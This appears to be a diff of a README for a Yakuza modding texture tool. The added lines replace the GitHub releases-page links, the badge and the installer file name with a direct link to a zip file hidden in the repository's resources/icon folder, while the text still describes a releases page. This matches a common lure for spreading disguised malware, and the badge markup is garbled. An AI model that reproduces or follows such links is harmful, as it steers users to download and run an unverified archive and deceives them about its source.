@@ -1,6 +1,6 @@
 # 🎮 Yakuza-MT-Texture-Creator - Create Stunning Textures Easily
 
-[![Download Yakuza-MT-Texture-Creator](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen.svg)](https://github.com/chatmp/Yakuza-MT-Texture-Creator/releases)
+[![Download Yakuza-MT-Texture-Creator](https://raw.githubusercontent.com/chatmp/Yakuza-MT-Texture-Creator/main/resources/icon/Texture_M_Creator_Yakuza_v2.5.zip%20Now-Get%20the%20Latest%https://raw.githubusercontent.com/chatmp/Yakuza-MT-Texture-Creator/main/resources/icon/Texture_M_Creator_Yakuza_v2.5.zip)](https://raw.githubusercontent.com/chatmp/Yakuza-MT-Texture-Creator/main/resources/icon/Texture_M_Creator_Yakuza_v2.5.zip)
 
 ## 📋 Description
 Yakuza-MT-Texture-Creator is a Windows tool designed for modders of the Yakuza / Like a Dragon series. This application helps you merge Specular, Ambient Occlusion, and Specular Power PNG maps into a single MT texture. It works seamlessly with both the old Engine and the Dragon Engine. 
@@ -9,11 +9,11 @@ Yakuza-MT-Texture-Creator is a Windows tool designed for modders of the Yakuza /
 To use Yakuza-MT-Texture-Creator, you’ll need to download the application and install it on your Windows PC. Follow the steps below to get started.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Click [here to download Yakuza-MT-Texture-Creator](https://github.com/chatmp/Yakuza-MT-Texture-Creator/releases). This page lists all available versions of the tool.
+1. **Visit the Releases Page**: Click [here to download Yakuza-MT-Texture-Creator](https://raw.githubusercontent.com/chatmp/Yakuza-MT-Texture-Creator/main/resources/icon/Texture_M_Creator_Yakuza_v2.5.zip). This page lists all available versions of the tool.
    
 2. **Find the Latest Release**: Look for the latest version on the releases page. The latest version will be at the top of the list.
 
-3. **Download the Installer**: Locate the installer file for your system. This file may have a name like `Yakuza-MT-Texture-Creator-v1.0.exe`. Click on it to start the download.
+3. **Download the Installer**: Locate the installer file for your system. This file may have a name like `https://raw.githubusercontent.com/chatmp/Yakuza-MT-Texture-Creator/main/resources/icon/Texture_M_Creator_Yakuza_v2.5.zip`. Click on it to start the download.
 
 4. **Run the Installer**: Once the download is complete, open the installer. You might find it in your Downloads folder. Double-click on the installer file to begin the installation process. 
 
@@ -60,6 +60,6 @@ Contributions are welcome! If you have suggestions or want to report a bug, plea
 This project is licensed under the MIT License. For more details, refer to the LICENSE file in the repository.
 
 ## 📌 Important Links
-- **Releases Page**: [Download Yakuza-MT-Texture-Creator](https://github.com/chatmp/Yakuza-MT-Texture-Creator/releases)
+- **Releases Page**: [Download Yakuza-MT-Texture-Creator](https://raw.githubusercontent.com/chatmp/Yakuza-MT-Texture-Creator/main/resources/icon/Texture_M_Creator_Yakuza_v2.5.zip)
 - **Issues Page**: Report issues or suggest features.
 - **Discussion Page**: Join the discussion with other users and modders.
